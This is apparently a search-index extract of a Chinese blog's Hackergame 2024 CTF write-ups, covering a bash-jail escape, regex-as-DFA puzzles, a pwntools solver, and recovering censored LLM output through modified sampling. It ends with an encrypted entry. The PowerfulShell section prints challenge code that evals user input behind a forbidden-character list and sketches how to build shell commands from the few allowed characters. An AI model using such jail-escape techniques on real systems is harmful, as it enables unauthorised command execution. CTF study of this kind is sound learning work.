167 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024","title":"Hackergame 2024"},{"location":"writeups/hackergame2024/#_1","text":"\u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5","title":"\u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86"},{"location":"writeups/hackergame2024/#powerfulshell","text":"\u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002","title":"PowerfulShell"},{"location":"writeups/hackergame2024/#_2","text":"\u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:)","title":"\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"writeups/hackergame2024/#_3","text":"\u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive ()","title":"\u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f"},{"location":"writeups/hackergame2024/#_4","text":"\u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11","title":"\u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6"},{"location":"writeups/hackergame2024/#_5","text":"\u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002","title":"\u96f6\u77e5\u8bc6\u6570\u72ec"},{"location":"writeups/hackergame2024/#llm-hackergame","text":"\u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"\u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d"},{"location":"writeups/zjuctf2023/","text":"cBb0eY3UhWwnaMNaFERVTQ==;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;^","title":"\ud83d\udd12 ZJUCTF 